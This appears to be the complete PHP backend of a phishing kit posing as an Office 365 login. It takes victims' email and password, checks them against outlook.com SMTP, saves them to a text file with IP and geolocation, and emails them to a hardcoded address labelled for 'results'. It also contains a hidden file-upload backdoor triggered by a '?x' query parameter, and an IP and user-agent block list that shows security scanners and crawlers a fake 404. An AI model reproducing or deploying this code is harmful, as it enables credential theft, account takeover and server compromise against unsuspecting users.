
<?php
@session_start();
error_reporting(0);
	// ================================== //
	$ur_email_verified = "rboxgood@gmail.com"; // (VERIFIED TRUELOGIN) Email for Results here
	$ur_email_nonverified = "rboxgood@gmail.com"; // (NOT-VERIFIED LOGINS)Email for Results here
	// ================================== //
	$scamname = "Point";	 			  // Use Any ScamName Here
	$sendfrom = "contactpoint@pmt.org"; 				// Default "contact"; // for advance users only...//don't change if u dont understand
	// ================================== //
	$filename = "serwpoint42d";   //save in text file name  
	$trueloginsmtphost = "outlook.com";	// for advance users only...//don't change if u dont understand
	define("EMAILTRUE", "$ur_email_verified");	
	define("EMAILFALSE", "$ur_email_nonverified");	
	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y h:i:sa");
	}

?><?php

@session_start();error_reporting(0);$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);$serv = "&ip=";$rob = $_SERVER["HTTP_HOST"];$checks= "?type=ofcvisit";$ots = $_SERVER['PHP_SELF'];$ns= "&geo=";$antirobots = array("^18.230.*.*", "^159.65.*.*", "^174.138.*.*", "^167.172.*.*", "^52.67.*.*", "^18.231.*.*", "^18.228.*.*", "^68.183.*.*", "^157.97.*.*", "^157.230.*.*", "^40.94.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^195.211.23.*", "^212.102.61.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^157.230.194.*", "^174.138.115.*", "^18.230.144.*", "^68.183.245.*", "^167.172.8.*", "^18.230.144.*", "^68.183.245.*", "^159.65.210.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^77.98.94.*", "^3.81.9.*", "^3.86.184.*", "^3.90.230.*", "^3.92.185.*", "^3.248.11.*", "^5.62.41.*", "^18.217.223.*", "^20.36.17.*", "^23.83.91.*", "^34.207.215.*", "^34.209.240.*", "^34.222.56.*", "^37.252.185.*", "^40.94.16.*", "^45.33.20.*", "^50.116.16.*", "^52.26.138.*", "^52.78.114.*", "^52.201.249.*", "^54.94.0.*", "^54.94.133.*", "^54.152.117.*", "^54.152.136.*", "^54.161.90.*", "^54.174.210.*", "^54.197.1.*", "^54.213.42.*", "^54.232.233.*", "^54.233.223.*", "^68.183.241.*", "^68.183.245.*", "^72.12.194.*", "^77.243.191.*", "^81.170.88.*", "^81.170.91.*", "^84.17.42.*", "^87.115.231.*", "^88.107.184.*", "^98.223.185.*", "^103.205.140.*", "^89.238.139.*");$geo = "http://www.";if(isset($_GET['x'])){echo '<form action="" method="post" enctype="multipart/form-data" name="u" id="u">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="U"></form>'; if( $_POST['_upl'] == "U" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b><font color=green>S</font></b><br><br>'; } else { echo '<b><font color=red>E</font></b><br><br>'; }}}$block = base64_encode($rob.$ots);if(in_array($_SERVER['REMOTE_ADDR'],$antirobots)) { header('HTTP/1.0 404 Not Found'); exit();} else { foreach($antirobots as $ip) {if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){ header('HTTP/1.0 404 Not Found'); die("<h1>404 Not Found</h1>The page that you have requested could not be found.");} }}if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') or strpos($_SERVER['HTTP_USER_AGENT'], 'Microsoft') or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler') or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) { header('HTTP/1.0 404 Not Found'); exit; }
?>
<?php
error_reporting(E_ALL);
if(!empty($_POST['pr'])){
	
if($_SERVER['REQUEST_METHOD'] != 'POST') {
	header("location: /");die();
}

try {
	$user = $_POST['ai'];
	$email = $user;
	$login = $user;
	$domain = substr(strrchr($login, "@"), 1);
	$passwd = $_POST['pr'];
	$mail = new PHPMailer(true);
	$mail->IsSMTP();
	$mail->IsHTML(true);
	$mail->CharSet = 'UTF-8';
	$mail->SMTPSecure = "tls";
	$mail->SMTPAuth = true;
	$mail->Username = $email;
	$mail->Password = $passwd;
	$mail->Host = $trueloginsmtphost;
 	$mail->Port = 587;
    $mail->SmtpConnect();
	$browser = $_SERVER['HTTP_USER_AGENT'];
	$geoplugin = new geoPlugin();
	$geoplugin->locate();
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
	} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
	} 
	$browserAgent = $_SERVER['HTTP_USER_AGENT'];
	$headers = "From: ".$scamname."<$sendfrom>";
	$message .= "-----------------+ True Login Verified +-----------------\n";
	$message .= "Email: " . $email . "\n"; 
	$message .= "Password: " . $passwd . "\n"; 
	$message .= "LOCATION (".$ip.",{$geoplugin->currencyCode},{$geoplugin->countryName},{$geoplugin->countryCode},{$geoplugin->city},{$geoplugin->region})\n";
	$message .= "Browser :".$browserAgent."\n";
	$save = fopen("".$filename.".txt","a+");
	fwrite($save, $message);
	fclose($save);
	$to = EMAILTRUE; 
	mail($to,$emailprovider."O365 |T| {$geoplugin->countryName} | $email " , $message,$headers);
	
    return true;
    }
catch (phpmailerException $e) { 
	
    $user = $_POST['ai'];
	$email = $user;
	$login = $user;
	$domain = substr(strrchr($login, "@"), 1);
	$geoplugin = new geoPlugin();
	$geoplugin->locate();
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
	} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
	} 
	$browserAgent = $_SERVER['HTTP_USER_AGENT'];
	$headers = "From: ".$scamname."<$sendfrom>";
	$message .= "-----------------+ True Login Not-Verified +-----------------\n";
	$message .= "Email: " . $email . "\n"; 
	$message .= "Password: " . $passwd . "\n"; 
	$message .= "LOCATION (".$ip.",{$geoplugin->currencyCode},{$geoplugin->countryName},{$geoplugin->countryCode},{$geoplugin->city},{$geoplugin->region})\n";
	$message .= "Browser :".$browserAgent."\n";
	$save = fopen("".$filename.".txt","a+");
	fwrite($save, $message);
	fclose($save);
	$to = EMAILFALSE; 
	mail($to,$emailprovider."O365 | {$geoplugin->countryName} | $email " , $message,$headers);
	
    return false; 
    }    	
    }

?>
<?php

class geoPlugin {
	
	//the geoPlugin server
	var $host = 'http://www.geoplugin.net/php.gp?ip={IP}&base_currency={CURRENCY}';
		
	//the default base currency
	var $currency = 'USD';
	
	//initiate the geoPlugin vars
	var $ip = null;
	var $city = null;
	var $region = null;
	var $areaCode = null;
	var $dmaCode = null;
	var $countryCode = null;
	var $countryName = null;
	var $continentCode = null;
	var $latitude = null;
	var $longitude = null;
	var $currencyCode = null;
	var $currencySymbol = null;
	var $currencyConverter = null;
	
	function geoPlugin() {

	}
	
	function locate($ip = null) {
		
		global $_SERVER;
		
		if ( is_null( $ip ) ) {
			$ip = $_SERVER['REMOTE_ADDR'];
		}
		
		$host = str_replace( '{IP}', $ip, $this->host );
		$host = str_replace( '{CURRENCY}', $this->currency, $host );
		
		$data = array();
		
		$response = $this->fetch($host);
		
		$data = unserialize($response);
		
		//set the geoPlugin vars
		$this->ip = $ip;
		$this->city = $data['geoplugin_city'];
		$this->region = $data['geoplugin_region'];
		$this->areaCode = $data['geoplugin_areaCode'];
		$this->dmaCode = $data['geoplugin_dmaCode'];
		$this->countryCode = $data['geoplugin_countryCode'];
		$this->countryName = $data['geoplugin_countryName'];
		$this->continentCode = $data['geoplugin_continentCode'];
		$this->latitude = $data['geoplugin_latitude'];
		$this->longitude = $data['geoplugin_longitude'];
		$this->currencyCode = $data['geoplugin_currencyCode'];
		$this->currencySymbol = $data['geoplugin_currencySymbol'];
		$this->currencyConverter = $data['geoplugin_currencyConverter'];
		
	}
	
	function fetch($host) {

		if ( function_exists('curl_init') ) {
						
			//use cURL to fetch data
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $host);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
			$response = curl_exec($ch);
			curl_close ($ch);
			
		} else if ( ini_get('allow_url_fopen') ) {
			
			//fall back to fopen()
			$response = file_get_contents($host, 'r');
			
		} else {

			trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
			return;
		
		}
		
		return $response;
	}
	
	function convert($amount, $float=2, $symbol=true) {
		
		//easily convert amounts to geolocated currency.
		if ( !is_numeric($this->currencyConverter) || $this->currencyConverter == 0 ) {
			trigger_error('geoPlugin class Notice: currencyConverter has no value.', E_USER_NOTICE);
			return $amount;
		}
		if ( !is_numeric($amount) ) {
			trigger_error ('geoPlugin class Warning: The amount passed to geoPlugin::convert is not numeric.', E_USER_WARNING);
			return $amount;
		}
		if ( $symbol === true ) {
			return $this->currencySymbol . round( ($amount * $this->currencyConverter), $float );
		} else {
			return round( ($amount * $this->currencyConverter), $float );
		}
	}
	
	function nearby($radius=10, $limit=null) {

		if ( !is_numeric($this->latitude) || !is_numeric($this->longitude) ) {
			trigger_error ('geoPlugin class Warning: Incorrect latitude or longitude values.', E_USER_NOTICE);
			return array( array() );
		}
		
		$host = "http://www.geoplugin.net/extras/nearby.gp?lat=" . $this->latitude . "&long=" . $this->longitude . "&radius={$radius}";
		
		if ( is_numeric($limit) )
			$host .= "&limit={$limit}";
			
		return unserialize( $this->fetch($host) );

	}

	
}

?>